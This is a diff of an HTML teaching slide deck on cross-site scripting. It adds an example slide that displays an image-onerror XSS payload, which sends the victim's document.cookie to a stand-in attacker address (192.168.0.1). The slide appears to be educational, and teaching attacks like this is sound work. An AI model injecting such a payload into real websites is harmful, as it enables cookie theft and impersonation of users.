@@ -1,21 +1,41 @@
 <section>
-  <h2>Cross-Site Scripting</h2>
-  <ul style="font-size: 0.8em">
-    <li>
-      attacker attaches code onto a legitimate website that will execute when
-      the victim loads the website
-    </li>
-    <li>
-      helps attacker to steal user cookies to impersonate the user & show popups
-      and Ads
-    </li>
-  </ul>
-  <div class="diagram-illustration">
-    <img
-      class="r-stretch"
-      style="width: 60%"
-      src="https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
-      alt=""
-    />
-  </div>
+  <section>
+    <h2>Cross-Site Scripting</h2>
+    <ul style="font-size: 0.8em">
+      <li>
+        attacker attaches code onto a legitimate website that will execute when
+        the victim loads the website
+      </li>
+      <li>
+        helps attacker to steal user cookies to impersonate the user & show
+        popups and Ads
+      </li>
+    </ul>
+    <div class="diagram-illustration">
+      <img
+        class="r-stretch"
+        style="width: 60%"
+        src="https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
+        alt=""
+      />
+    </div>
+  </section>
+  <section>
+    <h2>Example</h2>
+    <div style="font-size: 0.8em">
+      <pre><code class="html" id="imgXssInjection" data-trim contenteditable></code></pre>
+    </div>
+    <div class="diagram-illustration">
+      <img
+        class="r-stretch"
+        style="width: 60%"
+        src="https://i.stack.imgur.com/ASQbz.png"
+        alt=""
+      />
+    </div>
+    <script>
+      const injectScript = `<img src=x onerror=this.src='http://192.168.0.1:80/?'+document.cookie;>`;
+      document.getElementById("imgXssInjection").innerText = injectScript;
+    </script>
+  </section>
 </section>
